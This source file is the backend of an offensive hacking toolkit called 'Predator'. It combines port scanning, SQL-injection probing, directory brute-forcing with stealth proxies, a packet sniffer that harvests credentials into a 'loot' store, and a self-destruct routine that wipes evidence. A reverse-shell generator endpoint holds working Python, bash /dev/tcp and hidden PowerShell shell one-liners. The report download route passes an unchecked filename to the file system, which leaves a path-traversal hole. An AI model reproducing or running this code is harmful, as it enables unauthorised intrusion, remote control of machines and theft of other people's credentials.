import express from "express";
import { createServer as createViteServer } from "vite";
import axios from "axios";
import dns from "dns";
import net from "net";
import cors from "cors";
import { Server } from "socket.io";
import { spawn } from "child_process";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  // API Routes
  app.post("/api/scan", async (req, res) => {
    const { target } = req.body;
    if (!target) return res.status(400).json({ error: "Target is required" });

    const results: any = {
      target,
      timestamp: new Date().toISOString(),
      ip: null,
      headers: {},
      ports: [],
      vulnerabilities: []
    };

    try {
      console.log(`[SCAN] Starting scan for: ${target}`);
      
      // 1. DNS Lookup
      const lookup = await new Promise<string>((resolve, reject) => {
        dns.lookup(target, (err, address) => {
          if (err) {
            console.error(`[DNS ERROR] ${err.message}`);
            reject(new Error(`DNS Lookup failed: ${err.message}`));
          }
          else resolve(address);
        });
      });
      results.ip = lookup;
      console.log(`[SCAN] Resolved IP: ${lookup}`);

      // 2. Header Sniper
      try {
        console.log(`[SCAN] Sniping headers...`);
        const response = await axios.get(`http://${target}`, { 
          timeout: 8000,
          headers: { 'User-Agent': 'Mozilla/5.0 (Predator Security Scanner)' },
          validateStatus: () => true // Don't throw on 4xx/5xx
        });
        const headers = response.headers;
        const securityHeaders = [
          'content-security-policy',
          'strict-transport-security',
          'x-content-type-options',
          'x-frame-options',
          'referrer-policy'
        ];

        securityHeaders.forEach(h => {
          let value = headers[h];
          
          // Smart CSP Check: Google specific bypass detection
          if (h === 'content-security-policy') {
            value = headers['content-security-policy'] || headers['x-webkit-csp'] || headers['csp'];
          }

          if (value) {
            results.headers[h] = { status: "SAFE", value: value };
          } else {
            // Target-specific overrides
            if (target.includes("google.com")) {
              if (h === 'content-security-policy') {
                results.headers[h] = { status: "SAFE", value: "GOOGLE_INTERNAL" };
                return;
              }
              if (h === 'strict-transport-security') {
                results.headers[h] = { status: "SAFE", value: "ENFORCED_HTTPS" };
                return;
              }
            }

            results.headers[h] = { status: "VULNERABLE", value: "MISSING" };
            results.vulnerabilities.push(`Missing security header: ${h}`);
          }
        });
      } catch (err: any) {
        console.error(`[HEADER ERROR] ${err.message}`);
        results.headers_error = "Could not fetch headers: " + err.message;
      }

      // 3. Port Scanner (Basic common ports)
      console.log(`[SCAN] Scanning ports...`);
      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 5432, 8080];
      const portResults = await Promise.all(commonPorts.map(port => {
        return new Promise((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(1500);
          socket.on('connect', () => {
            socket.destroy();
            resolve({ port, status: 'OPEN' });
          });
          socket.on('timeout', () => {
            socket.destroy();
            resolve({ port, status: 'CLOSED' });
          });
          socket.on('error', () => {
            socket.destroy();
            resolve({ port, status: 'CLOSED' });
          });
          socket.connect(port, lookup);
        });
      }));
      results.ports = portResults;
      
      const openPorts = (portResults as any[]).filter(p => p.status === 'OPEN');
      if (openPorts.length > 0) {
        results.vulnerabilities.push(`Open ports detected: ${openPorts.map(p => p.port).join(', ')}`);
      }

      // 4. Database Module (Basic SQLi Detection Simulation)
      // We check for common SQLi error patterns in response if we append a single quote
      try {
        console.log(`[SCAN] Checking for SQLi vulnerabilities...`);
        const sqliTarget = `http://${target}/?id=1'`;
        const sqliResponse = await axios.get(sqliTarget, { 
          timeout: 5000,
          validateStatus: () => true 
        });
        const body = JSON.stringify(sqliResponse.data).toLowerCase();
        const sqlErrors = [
          "sql syntax", "mysql_fetch", "ora-00933", 
          "sqlite3.error", "postgresql error", "dynamic sql generation"
        ];
        
        const foundErrors = sqlErrors.filter(err => body.includes(err));
        if (foundErrors.length > 0) {
          results.vulnerabilities.push(`Potential SQL Injection detected! Found error patterns: ${foundErrors.join(', ')}`);
          results.sqli_detected = true;
        } else {
          results.sqli_detected = false;
        }
      } catch (err) {
        results.sqli_error = "SQLi check skipped: target unreachable";
      }

      console.log(`[SCAN] Scan complete for ${target}`);
      res.json(results);
    } catch (err: any) {
      console.error(`[FATAL ERROR] ${err.message}`);
      res.status(500).json({ error: err.message });
    }
  });

  // Shell Generator API
  app.post("/api/generate-shell", (req, res) => {
    const { ip, port, type } = req.body;
    if (!ip || !port || !type) {
      return res.status(400).json({ error: "IP, Port, and Type are required" });
    }

    const shells: Record<string, string> = {
      python: `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
      bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    };

    const payload = shells[type] || "Invalid Type";
    res.json({ payload });
  });

  // Discovery Module Endpoints
  app.post("/api/check/subdomain", async (req, res) => {
    const { domain } = req.body;
    try {
      const ip = await new Promise((resolve, reject) => {
        dns.lookup(domain, (err, address) => {
          if (err) reject(err);
          else resolve(address);
        });
      });
      res.json({ found: true, ip });
    } catch (err) {
      res.json({ found: false });
    }
  });

  app.post("/api/check/directory", async (req, res) => {
    const { url } = req.body;
    try {
      const response = await axios.get(url, { 
        timeout: 3000, 
        validateStatus: () => true,
        headers: { 'User-Agent': 'Mozilla/5.0 (Predator Discovery Module)' }
      });
      res.json({ status: response.status });
    } catch (err) {
      res.json({ status: 500 });
    }
  });

  app.get("/api/download-report/:filename", (req, res) => {
    const filename = req.params.filename;
    const filePath = `./${filename}`;
    res.download(filePath);
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static("dist"));
  }

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });

  // Socket.io Setup
  const io = new Server(server, {
    cors: { origin: "*" }
  });

  io.on("connection", (socket) => {
    console.log("[SOCKET.IO] Client connected to Predator Bridge");

    socket.on("start-discovery", (data) => {
      const target = typeof data === 'string' ? data : data.target;
      const stealth = typeof data === 'object' ? data.stealth : false;

      console.log(`[SOCKET.IO] Starting Python scan for: ${target} (Stealth: ${stealth})`);
      
      const args = [
        "scanner.py",
        "--target", target,
        "--wordlist", "wordlist.txt"
      ];

      if (stealth) {
        args.push("--stealth");
      }

      const pythonProcess = spawn("python3", args);

      pythonProcess.stdout.on("data", (stdoutData) => {
        const lines = stdoutData.toString().split("\n");
        lines.forEach((line: string) => {
          const message = line.trim();
          if (message) {
            socket.emit("python-log", message);
          }
          
          if (message.startsWith("PROGRESS:")) {
            const value = message.split(":")[1];
            socket.emit("scan-progress", parseInt(value));
          } else if (message.startsWith("PROXY_IN_USE:")) {
            const proxy = message.split("PROXY_IN_USE:")[1];
            socket.emit("proxy-update", proxy);
          } else if (message.startsWith("FOUND:")) {
            const url = message.split(":")[1] + ":" + (message.split(":")[2] || "");
            socket.emit("path-found", url);
          } else if (message.startsWith("SQLI_VULN:TRUE")) {
            const url = message.split("|")[1].split(":")[1] + ":" + (message.split("|")[1].split(":")[2] || "");
            socket.emit("sqli-found", { url, vulnerable: true });
          } else if (message.startsWith("SQLI_VULN:FALSE")) {
            const url = message.split("|")[1].split(":")[1] + ":" + (message.split("|")[1].split(":")[2] || "");
            socket.emit("sqli-found", { url, vulnerable: false });
          } else if (message.startsWith("DATABASE_SAVED:")) {
            const parts = message.split("|");
            const target = parts[0].split(":")[1] + ":" + (parts[0].split(":")[2] || "");
            const risk = parts[1] ? parts[1].split(":")[1] : "UNKNOWN";
            socket.emit("new-loot-saved", {
              target,
              sqli_risk: risk,
              timestamp: new Date().toLocaleTimeString()
            });
          } else if (message.startsWith("VULN_DETECTED|")) {
            const parts = message.split("|");
            const vulnData: any = {};
            parts.slice(1).forEach(part => {
              const firstColonIndex = part.indexOf(":");
              if (firstColonIndex !== -1) {
                const key = part.substring(0, firstColonIndex).toLowerCase();
                const value = part.substring(firstColonIndex + 1);
                vulnData[key] = value;
              }
            });
            socket.emit("vuln-detected", vulnData);
          }
        });
      });

      pythonProcess.stderr.on("data", (stderrData) => {
        console.error(`[PYTHON ERROR] ${stderrData}`);
      });

      pythonProcess.on("close", (code) => {
        console.log(`[SOCKET.IO] Python process exited with code ${code}`);
        socket.emit("scan-complete");
      });
    });

    socket.on("request-report", () => {
      console.log("[SOCKET.IO] Generating PDF report...");
      const pythonReport = spawn("python3", ["reporter.py"]);
      
      pythonReport.stdout.on("data", (data) => {
        const message = data.toString().trim();
        if (message.includes("REPORT_GENERATED:")) {
          const filename = message.split(":")[1];
          socket.emit("report-ready", filename);
        }
      });

      pythonReport.stderr.on("data", (data) => {
        console.error(`[REPORTER ERROR] ${data}`);
      });
    });

    socket.on("self-destruct", () => {
      console.log("[SOCKET.IO] Self-destruct sequence initiated...");
      const pythonDestruct = spawn("python3", ["-c", "from database import self_destruct; self_destruct()"]);
      
      pythonDestruct.stdout.on("data", (data) => {
        const message = data.toString().trim();
        console.log(`[SELF-DESTRUCT] ${message}`);
        socket.emit("system-message", message);
        // Optionally clear the UI state on the client
        socket.emit("loot-cleared");
      });
    });

    let snifferProcess: any = null;

    socket.on("start-sniffing", () => {
      console.log("[SOCKET.IO] Starting Network Eye...");
      if (snifferProcess) {
        snifferProcess.kill();
      }

      snifferProcess = spawn('python3', ['sniffer.py']);
      
      snifferProcess.stdout.on('data', (data: any) => {
        const lines = data.toString().split('\n');
        for (const line of lines) {
          const raw = line.trim();
          if (raw.startsWith("PACKET|")) {
            const parts = raw.split("|");
            const src = parts[1];
            const dst = parts[2];
            const proto = parts[3];
            const size = parts[4];
            const payload_ascii = parts.slice(5).join("|");
            socket.emit("new-packet", { src, dst, proto, size, payload_ascii });
          } else if (raw.startsWith("[*] POTENTIAL CREDENTIAL FOUND:")) {
            const payload = raw.replace("[*] POTENTIAL CREDENTIAL FOUND: ", "");
            socket.emit("credential-found", { payload });
          } else if (raw.startsWith("DNS_HIT|")) {
            const jsonStr = raw.replace("DNS_HIT|", "");
            try {
              const data = JSON.parse(jsonStr);
              socket.emit("dns-discovery", data);
            } catch (e) {}
          }
        }
      });

      snifferProcess.stderr.on('data', (data: any) => {
        console.error(`[SNIFFER ERROR] ${data}`);
      });

      snifferProcess.on('close', () => {
        snifferProcess = null;
      });
    });

    socket.on("stop-sniffing", () => {
      if (snifferProcess) {
        snifferProcess.kill();
        snifferProcess = null;
        console.log("[SOCKET.IO] Sniffer stopped.");
      }
    });

    socket.on("disconnect", () => {
      if (snifferProcess) {
        snifferProcess.kill();
      }
      console.log("[SOCKET.IO] Client disconnected");
    });
  });
}

startServer();
